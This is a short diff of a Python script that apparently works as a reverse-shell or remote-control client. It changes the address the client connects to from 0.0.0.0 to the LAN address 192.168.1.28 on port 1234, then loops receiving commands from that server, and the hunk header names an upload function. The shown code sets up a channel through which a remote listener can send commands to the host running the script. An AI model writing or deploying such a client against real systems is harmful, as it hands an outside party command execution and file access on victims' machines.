@@ -29,7 +29,7 @@ def upload(s, path):
 
 def connecting():
     s = socket.socket()
-    s.connect(("0.0.0.0", 1234)) # Server IP and Listening Port
+    s.connect(("192.168.1.28", 1234)) # Server IP and Listening Port
 
     while True:
         command = s.recv(BUFFER_SIZE)
